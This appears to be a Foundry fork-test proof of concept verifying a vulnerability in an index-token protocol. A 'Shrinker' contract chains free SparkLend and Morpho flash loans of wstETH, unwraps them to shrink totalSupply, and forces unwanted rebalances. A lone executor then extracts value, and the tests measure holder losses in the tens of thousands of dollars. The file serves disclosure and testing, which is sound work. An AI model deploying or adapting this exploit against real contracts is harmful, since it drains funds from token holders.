// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {console2} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IndexFactory} from "../../src/IndexFactory.sol";
import {IndexToken} from "../../src/IndexToken.sol";
import {IIndexFactory} from "../../src/interfaces/IIndexFactory.sol";
import {IIndexRule} from "../../src/interfaces/IIndexRule.sol";
import {IIndexToken} from "../../src/interfaces/IIndexToken.sol";
import {IXindexErrors} from "../../src/interfaces/IXindexErrors.sol";
import {IRebalanceExecutor} from "../../src/interfaces/IRebalanceExecutor.sol";
import {IAggregatorV3} from "../../src/interfaces/IAggregatorV3.sol";
import {CompositeFeed} from "../../src/CompositeFeed.sol";
import {ConfigureWhitelist} from "../../script/ConfigureWhitelist.s.sol";
import {MainnetAddresses as M} from "../../script/MainnetAddresses.sol";
import {ForkFeeds} from "../fork/ForkFeeds.sol";
import {RebalanceExecutorV3} from "../fork/RebalanceExecutorV3.sol";
import {ISwapRouter02} from "../mocks/ISwapRouter02.sol";

interface IWstETHv {
    function wrap(uint256) external returns (uint256);
    function unwrap(uint256) external returns (uint256);
    function stETH() external view returns (address);
    function stEthPerToken() external view returns (uint256);
}

interface ISparkPool {
    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 ref)
        external;
    function FLASHLOAN_PREMIUM_TOTAL() external view returns (uint128);
}

interface IMorphoBlue {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IAggProxy {
    function aggregator() external view returns (address);
}

/// @notice Unprivileged stranger. Borrows wstETH at zero fee (SparkLend + Morpho Blue), unwraps it (burning wstETH),
///         starts rebalances on every given index, wraps back and repays. One transaction, no privileges.
contract Shrinker {
    using SafeERC20 for IERC20;

    address constant SPARK = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    IIndexToken[] internal _targets;
    uint256 internal _spark;
    uint256 internal _morpho;
    uint256 public supplyInside;
    uint256[] public turnoverInside;

    receive() external payable {}

    /// @dev Tiny wstETH float to cover the few wei of stETH share rounding on the unwrap/wrap round trip.
    function seed() external payable {
        (bool ok,) = WSTETH.call{value: msg.value}("");
        require(ok, "seed");
    }

    function attack(IIndexToken[] calldata idx, uint256 sparkAmount, uint256 morphoAmount) external {
        delete _targets;
        delete turnoverInside;
        for (uint256 i = 0; i < idx.length; ++i) _targets.push(idx[i]);
        _spark = sparkAmount;
        _morpho = morphoAmount;
        if (sparkAmount > 0) ISparkPool(SPARK).flashLoanSimple(address(this), WSTETH, sparkAmount, "", 0);
        else _morphoLeg();
    }

    function executeOperation(address, uint256 amount, uint256 premium, address initiator, bytes calldata)
        external
        returns (bool)
    {
        require(msg.sender == SPARK && initiator == address(this), "spark");
        _morphoLeg();
        IERC20(WSTETH).forceApprove(SPARK, amount + premium);
        return true;
    }

    function _morphoLeg() internal {
        if (_morpho > 0) IMorphoBlue(MORPHO).flashLoan(WSTETH, _morpho, "");
        else _core();
    }

    function onMorphoFlashLoan(uint256 assets, bytes calldata) external {
        require(msg.sender == MORPHO, "morpho");
        _core();
        IERC20(WSTETH).forceApprove(MORPHO, assets);
    }

    function _core() internal {
        IWstETHv(WSTETH).unwrap(_spark + _morpho);
        supplyInside = IERC20(WSTETH).totalSupply();
        for (uint256 i = 0; i < _targets.length; ++i) {
            (, uint256 t) = _targets[i].previewTarget(0);
            turnoverInside.push(t);
            _targets[i].startRebalance(0);
        }
        address steth = IWstETHv(WSTETH).stETH();
        uint256 st = IERC20(steth).balanceOf(address(this));
        IERC20(steth).forceApprove(WSTETH, st);
        IWstETHv(WSTETH).wrap(st);
    }
}

/// @notice Lone executor that delivers exactly `amountsIn` from a prefunded float and keeps `amountsOut`.
contract LoneExecutor is IRebalanceExecutor {
    using SafeERC20 for IERC20;

    function fill(IIndexToken index) external {
        index.executeRebalance("");
    }

    function onXindexRebalance(uint256[] calldata, uint256[] calldata amountsIn, bytes calldata) external {
        address[] memory t = IIndexToken(msg.sender).componentTokens();
        for (uint256 i = 0; i < t.length; ++i) {
            if (amountsIn[i] != 0) IERC20(t[i]).safeTransfer(msg.sender, amountsIn[i]);
        }
    }
}

contract VerifyWstethSupplyFlash is ForkFeeds {
    using SafeERC20 for IERC20;

    address constant SPARK = 0xC13e21B648A5Ee794902342038FF3aDAB66BE987;
    address constant SPARK_SPWSTETH = 0x12B54025C112Aa61fAce2CDB7118740875A566E9;
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;

    IndexFactory factory;
    IIndexRule rule;
    address guardian = makeAddr("guardian");
    address holder = makeAddr("holder");
    address stranger = makeAddr("stranger");
    Shrinker shrinker;

    IndexToken defi4; // uncapped [wstETH, LINK, UNI, AAVE]
    IndexToken capped7; // capped launch list

    function setUp() public {
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        if (blk == 0) vm.createSelectFork(url);
        else vm.createSelectFork(url, blk);

        factory = new IndexFactory(address(this), guardian);
        rule = IIndexRule(factory.RULE());
        _pinFeedsToTheBlockClock();

        CompositeFeed wbtcFeed = new CompositeFeed(
            IAggregatorV3(M.BTC_USD_FEED), IAggregatorV3(M.WBTC_BTC_FEED), M.STALENESS_1H, M.STALENESS_24H
        );
        // The shipped launch list, verbatim.
        ConfigureWhitelist.Entry[] memory list = (new ConfigureWhitelist()).defaultMainnetList(address(wbtcFeed));
        for (uint256 i = 0; i < list.length; ++i) {
            factory.proposeListing(
                list[i].token,
                IIndexFactory.TokenConfig({
                    feed: list[i].feed, maxStaleness: list[i].maxStaleness, referenceSupply: list[i].referenceSupply
                })
            );
        }
        vm.warp(block.timestamp + factory.LISTING_DELAY());
        for (uint256 i = 0; i < list.length; ++i) {
            factory.executeListing(list[i].token);
        }
        assertEq(factory.tokenConfig(M.WSTETH).referenceSupply, 0, "wstETH ships on live totalSupply");

        address[] memory t4 = new address[](4);
        (t4[0], t4[1], t4[2], t4[3]) = (M.WSTETH, M.LINK, M.UNI, M.AAVE);
        defi4 = _createOnRule(t4, 0, "DEFI4");

        address[] memory t7 = new address[](7);
        for (uint256 i = 0; i < 7; ++i) {
            t7[i] = list[i].token;
        }
        capped7 = _createOnRule(t7, 1, "CAP7");

        vm.prank(stranger);
        shrinker = new Shrinker();
        vm.deal(stranger, 0.01 ether);
        vm.prank(stranger);
        shrinker.seed{value: 0.01 ether}();
    }

    function _createOnRule(address[] memory tokens, uint8 meth, string memory sym) internal returns (IndexToken idx) {
        uint256[] memory units = rule.initialUnits(tokens, meth, 1_000e18);
        idx = IndexToken(factory.createIndex(sym, sym, tokens, units, meth));
        uint256 shares = 10_000e18; // $10M
        uint256[] memory need = idx.previewIssue(shares);
        for (uint256 i = 0; i < tokens.length; ++i) {
            deal(tokens[i], holder, need[i]); // balance only; wstETH totalSupply is untouched
            vm.prank(holder);
            IERC20(tokens[i]).forceApprove(address(idx), need[i]);
        }
        vm.prank(holder);
        idx.issue(shares, holder);
    }

    function _nav(IndexToken idx) internal view returns (uint256) {
        return rule.navPerToken(address(idx)) * idx.totalSupply() / 1e18;
    }

    function _attack(IndexToken[] memory idx, bool useSpark) internal {
        uint256 sparkAmt = useSpark ? IERC20(M.WSTETH).balanceOf(SPARK_SPWSTETH) : 0;
        uint256 morphoAmt = IERC20(M.WSTETH).balanceOf(MORPHO);
        IIndexToken[] memory ii = new IIndexToken[](idx.length);
        for (uint256 i = 0; i < idx.length; ++i) ii[i] = IIndexToken(address(idx[i]));
        vm.prank(stranger);
        shrinker.attack(ii, sparkAmt, morphoAmt);
    }

    /// @dev Settles as a lone executor at the 0.9 floor; returns holders' loss and executor's gain at feed prices.
    function _loneFill(IndexToken idx) internal returns (uint256 holderLoss, uint256 execGain) {
        (uint256 eta,,) = idx.pendingRebalance();
        vm.warp(eta + idx.AUCTION_DURATION());
        (uint256 mult,, uint256[] memory out, uint256[] memory inn) = idx.previewRebalance();
        assertEq(mult, 0.9e18, "floor multiplier");
        LoneExecutor ex = new LoneExecutor();
        address[] memory t = idx.componentTokens();
        for (uint256 i = 0; i < t.length; ++i) {
            if (inn[i] != 0) deal(t[i], address(ex), inn[i]);
        }
        (uint256 outV, uint256 inV) = rule.settlementValues(t, out, inn);
        uint256 navBefore = _nav(idx);
        ex.fill(IIndexToken(address(idx)));
        uint256 navAfter = _nav(idx);
        holderLoss = navBefore - navAfter;
        execGain = outV - inV;
        assertApproxEqAbs(holderLoss, execGain, 1e18, "holder loss == executor gain within $1");
    }

    /// Unwrap/wrap moves wstETH totalSupply and nothing the rule prices with.
    function test_unwrapMovesOnlySupply() public {
        // Fresh fork at the same block: setUp etched the feed proxies, this reads the real ones.
        string memory url = vm.envOr("MAINNET_RPC_URL", string("https://ethereum-rpc.publicnode.com"));
        uint256 blk = vm.envOr("FORK_BLOCK", uint256(0));
        if (blk == 0) vm.createSelectFork(url);
        else vm.createSelectFork(url, blk);
        address agg = 0x164b276057258d81941e97B0a900D4C7B358bCe0; // real proxy -> OCR2 aggregator
        console2.log("aggregator behind proxy", IAggProxy(agg).aggregator());
        (, int256 a0,, uint256 u0,) = IAggregatorV3(agg).latestRoundData();
        uint256 rate0 = IWstETHv(M.WSTETH).stEthPerToken();
        uint256 s0 = IERC20(M.WSTETH).totalSupply();
        uint256 amt = IERC20(M.WSTETH).balanceOf(MORPHO);
        vm.prank(MORPHO);
        IERC20(M.WSTETH).transfer(address(this), amt);
        IWstETHv(M.WSTETH).unwrap(amt);
        assertEq(IERC20(M.WSTETH).totalSupply(), s0 - amt, "supply cut");
        (, int256 a1,, uint256 u1,) = IAggregatorV3(agg).latestRoundData();
        assertEq(a1, a0, "OCR2 answer unchanged");
        assertEq(u1, u0);
        assertEq(IWstETHv(M.WSTETH).stEthPerToken(), rate0, "rate unchanged");
        assertEq(ISparkPool(SPARK).FLASHLOAN_PREMIUM_TOTAL(), 0, "Spark flash is free");
        console2.log("wstETH/USD answer", uint256(a1));
    }

    /// Main: honest start reverts; one stranger tx forces both indexes; lone fill; undo cost.
    function test_forcedRebalance_bothIndexes() public {
        vm.warp(block.timestamp + 28 days);
        IndexToken[] memory both = new IndexToken[](2);
        (both[0], both[1]) = (defi4, capped7);

        for (uint256 k = 0; k < 2; ++k) {
            (, uint256 honestT) = both[k].previewTarget(0);
            console2.log("honest turnover (1e18=100%)", honestT);
            assertLt(honestT, both[k].MIN_TURNOVER());
            vm.prank(stranger);
            vm.expectRevert(abi.encodeWithSelector(IIndexToken.TurnoverTooLow.selector, honestT));
            both[k].startRebalance(0);
        }

        uint256 supplyBefore = IERC20(M.WSTETH).totalSupply();
        uint256 floatBefore = IERC20(M.WSTETH).balanceOf(address(shrinker));
        (, uint256[] memory unitsD) = defi4.components();
        (, uint256[] memory unitsC) = capped7.components();

        _attack(both, true);

        uint256 supplyAfter = IERC20(M.WSTETH).totalSupply();
        uint256 cost = floatBefore - IERC20(M.WSTETH).balanceOf(address(shrinker));
        console2.log("supply before      ", supplyBefore);
        console2.log("supply in snapshot ", shrinker.supplyInside());
        console2.log("cut (bps)          ", (supplyBefore - shrinker.supplyInside()) * 10_000 / supplyBefore);
        console2.log("attacker wstETH cost (wei)", cost);
        console2.log("forced turnover DEFI4", shrinker.turnoverInside(0));
        console2.log("forced turnover CAP7 ", shrinker.turnoverInside(1));
        assertApproxEqAbs(supplyAfter, supplyBefore, 10, "supply restored");
        assertLe(cost, 10, "attack costs <= 10 wei wstETH");
        assertGe(shrinker.turnoverInside(0), defi4.MIN_TURNOVER());
        assertGe(shrinker.turnoverInside(1), capped7.MIN_TURNOVER());
        assertEq(defi4.proposalCount(), 1);
        assertEq(capped7.proposalCount(), 1);

        // Targets compared with what the rule says one block later on real supply.
        (, , uint256[] memory forcedD) = defi4.pendingRebalance();
        (, , uint256[] memory forcedC) = capped7.pendingRebalance();
        console2.log("DEFI4 wstETH target vs units (bps)", forcedD[0] * 10_000 / unitsD[0]);
        console2.log("DEFI4 LINK   target vs units (bps)", forcedD[1] * 10_000 / unitsD[1]);
        console2.log("CAP7  wstETH target vs units (bps)", forcedC[1] * 10_000 / unitsC[1]);
        console2.log("CAP7  WETH   target vs units (bps)", forcedC[0] * 10_000 / unitsC[0]);
        (uint256[] memory liveD,) = defi4.previewTarget(0);
        console2.log("guardian recompute: live DEFI4 wstETH target vs pending (bps)", liveD[0] * 10_000 / forcedD[0]);

        uint256 navD = _nav(defi4);
        uint256 navC = _nav(capped7);
        (uint256 lossD, uint256 gainD) = _loneFill(defi4);
        // Both auctions share the same eta, so capped7 fills at the same moment.
        (uint256 lossC, uint256 gainC) = _loneFill(capped7);
        console2.log("DEFI4 NAV $", navD / 1e18);
        console2.log("DEFI4 holder loss $", lossD / 1e18, "bps", lossD * 10_000 / navD);
        console2.log("DEFI4 executor gain $", gainD / 1e18);
        console2.log("CAP7 NAV $", navC / 1e18);
        console2.log("CAP7 holder loss $", lossC / 1e18, "bps", lossC * 10_000 / navC);
        console2.log("CAP7 executor gain $", gainC / 1e18);
        assertGt(lossD, 50_000e18);
        assertGt(lossC, 10_000e18);

        // The next cycle: the honest rule now wants to undo the forced trade.
        vm.warp(block.timestamp + 28 days);
        (, uint256 undoD) = defi4.previewTarget(0);
        (, uint256 undoC) = capped7.previewTarget(0);
        console2.log("undo turnover DEFI4", undoD);
        console2.log("undo turnover CAP7 ", undoC);
        assertGe(undoD, defi4.MIN_TURNOVER());
        assertGe(undoC, capped7.MIN_TURNOVER());
    }

    /// Morpho alone (no Spark): still clears MIN_TURNOVER on the wstETH-heavy index.
    function test_morphoOnly() public {
        vm.warp(block.timestamp + 28 days);
        IndexToken[] memory one = new IndexToken[](1);
        one[0] = defi4;
        uint256 s0 = IERC20(M.WSTETH).totalSupply();
        _attack(one, false);
        console2.log("morpho-only cut (bps)", (s0 - shrinker.supplyInside()) * 10_000 / s0);
        console2.log("morpho-only forced turnover DEFI4", shrinker.turnoverInside(0));
        assertGe(shrinker.turnoverInside(0), defi4.MIN_TURNOVER());
        uint256 nav = _nav(defi4);
        (uint256 loss,) = _loneFill(defi4);
        console2.log("morpho-only holder loss $", loss / 1e18, "bps", loss * 10_000 / nav);
    }

    /// Guardian can only cancel; its own start reverts; the stranger repeats after REBALANCE_DELAY.
    function test_guardianCancelLoop() public {
        vm.warp(block.timestamp + 28 days);
        IndexToken[] memory one = new IndexToken[](1);
        one[0] = defi4;
        for (uint256 round = 0; round < 3; ++round) {
            _attack(one, true);
            assertEq(defi4.proposalCount(), round + 1);
            vm.prank(guardian);
            defi4.cancelRebalance();
            (, uint256 t) = defi4.previewTarget(0);
            vm.prank(guardian);
            vm.expectRevert(abi.encodeWithSelector(IIndexToken.TurnoverTooLow.selector, t));
            defi4.startRebalance(0);
            vm.warp(defi4.restartAllowedAt());
        }
        assertEq(defi4.rebalanceNonce(), 0);
        assertEq(defi4.proposalCount(), 3);
    }
    /// The same forced DEFI4 auction filled at 0.9 by an executor that really swaps through Uniswap V3.
    function test_realSwapExecutorProfit() public {
        vm.warp(block.timestamp + 28 days);
        IndexToken[] memory one = new IndexToken[](1);
        one[0] = defi4;
        _attack(one, true);
        RebalanceExecutorV3 ex =
            new RebalanceExecutorV3(IIndexFactory(address(factory)), ISwapRouter02(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45), M.WETH);
        ex.setFee(M.WSTETH, 100);
        ex.setFee(M.LINK, 3000);
        ex.setFee(M.UNI, 3000);
        ex.setFee(M.AAVE, 3000);
        deal(M.WETH, address(ex), 1_000 ether);
        (uint256 eta,,) = defi4.pendingRebalance();
        vm.warp(eta + defi4.AUCTION_DURATION());
        uint256 navBefore = _nav(defi4);
        ex.fill(IIndexToken(address(defi4)));
        uint256 navAfter = _nav(defi4);
        uint256 wethAfter = IERC20(M.WETH).balanceOf(address(ex));
        assertGt(wethAfter, 1_000 ether, "executor profits after real swaps");
        uint256 profitUsd = (wethAfter - 1_000 ether) * rule.price(M.WETH) / 1e18;
        console2.log("real-swap executor profit $", profitUsd / 1e18);
        console2.log("holder loss $", (navBefore - navAfter) / 1e18);
    }
}
